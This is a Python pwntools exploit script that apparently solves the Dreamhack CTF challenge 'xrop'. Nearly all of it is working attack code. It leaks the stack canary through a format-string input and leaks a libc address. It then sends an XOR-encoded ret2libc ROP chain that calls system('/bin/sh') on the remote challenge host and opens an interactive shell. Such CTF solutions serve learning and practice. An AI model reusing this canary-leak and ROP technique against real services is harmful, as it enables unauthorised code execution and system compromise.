#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './prob_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'host1.dreamhack.games', 12714

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
b *main + 279
b *printf
c
'''.format(**locals())


# =========================================================
#                         EXPLOITS
# =========================================================
#└─# pwn checksec prob_patched
#[*] '/home/kali/Windows/Dreamhack CTF Season 7 Round #2 (Div. 2)/xrop/deploy/prob_patched'
#    Arch:       amd64-64-little
#    RELRO:      Full RELRO
#    Stack:      Canary found
#    NX:         NX enabled
#    PIE:        PIE enabled
#    RUNPATH:    b'.'
#    SHSTK:      Enabled
#    IBT:        Enabled
#    Stripped:   No


def encrypt(buf):
    buf = bytearray(buf)
    """
    Encrypt function based on the provided C-like code.
    Each byte in the buffer is XORed with the next byte.
    """
    encrypted = buf[:]
    for i in range(1, len(encrypted)):
        encrypted[i - 1] ^= encrypted[i]
    encrypted[-1] ^= ord('\n')
    return encrypted


def decrypt(buf):
    buf = bytearray(buf)
    """
    Decrypt function to reverse the encryption process.
    Uses the relationship of XOR to recover the original data.
    """
    decrypted = buf[:]
    decrypted[-1] ^= ord('\n')

    for i in range(len(decrypted) - 1, 0, -1):
        decrypted[i - 1] ^= decrypted[i]
    return decrypted

def exploit():
    global io
    offset = 24
    io = initialize()
    #Canary Leak
    payload = b"a"*21 + b"|" + b"%x"
    payload = decrypt(payload)
    io.sendlineafter("Input: ", payload)
    io.recvline()
    canary = u64(io.recvline().strip()[:-1].ljust(8, b"\x00")) << 8

    #Libc leak
    io.sendlineafter("Input: ", decrypt(b"AB"*20))
    io.recvline()
    libc_leak = u64(io.recvline().strip().ljust(8, b"\x00")) << 8
    libc.address = libc_leak - libc.sym["__libc_init_first"]

    log.info("Canary: %#x", canary)
    log.info("Libc leak: %#x", libc_leak)
    log.info("Libc leak: %#x", libc.address)

    #Getting shell
    rop = ROP(libc)
    rop.raw(p64(canary))
    rop.raw(0)
    rop.raw(rop.ret.address)
    rop.system(next(libc.search("/bin/sh\0")))
    print(rop.dump())

    payload = flat({offset:[rop.chain()]}, filler=b"\x00")
    io.sendlineafter("Input: ", decrypt(payload))
    io.interactive()
    
if __name__ == '__main__':
    exploit()
